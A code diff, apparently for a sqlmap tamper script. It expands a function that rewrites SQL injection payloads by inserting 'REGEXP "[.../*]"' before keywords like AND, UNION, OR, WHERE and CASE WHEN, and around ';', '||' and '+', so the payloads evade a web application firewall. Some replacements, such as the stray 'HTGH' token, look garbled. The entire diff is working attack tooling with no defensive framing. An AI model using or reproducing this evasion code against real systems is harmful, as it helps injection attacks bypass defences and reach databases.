@@ -23,7 +23,20 @@ def dependencies():
 
 def tamper(payload, **kwargs):
 
-        payload=payload.replace("and","REGEXP \"[.../*]\" and",1)
+        payload=payload.replace(" ","  ",1)
+        payload=payload.replace("  AND"," REGEXP \"[.../*]\" and",1)
         payload=re.sub(r'(ORDER BY \d+)', "x", payload)
-        payload=payload.replace("UNION","REGEXP \"[.../*]\" union",1)
+        payload=payload.replace("UNION"," REGEXP \"[.../*]\" union",1)
+        payload=payload.replace("(SELECT (CASE WHEN ("," REGEXP \"[.../*]\" (SELECT (CASE WHEN (",1)
+        payload=payload.replace("  AS "," REGEXP \"[.../*]\" as ",1)
+        payload=payload.replace(" OR "," REGEXP \"[.../*]\" or ",1)
+        payload=payload.replace("  WHERE "," REGEXP \"[.../*]\" where ",1)
+        payload=payload.replace("HIGH_RISK_OPERATION:0"," REGEXP \"[.../*]\"  ",1)
+        payload=payload.replace(";","; REGEXP \"[.../*]\"  HTGH",1)
+        payload=payload.replace("||","; || REGEXP \"[.../*]\" ",1)
+        payload=payload.replace("THEN"," THEN REGEXP \"[.../*]\" ",1)
+        payload=payload.replace("  IN"," REGEXP \"[.../*]\"  IN ",1)
+        #payload=payload.replace("-"," REGEXP \"[.../*]\"  - ",1)
+        payload=payload.replace("+"," REGEXP \"[.../*]\"  + ",1)
+        payload=payload.replace("WHEN"," REGEXP \"[.../*]\"   ",1)
         return payload
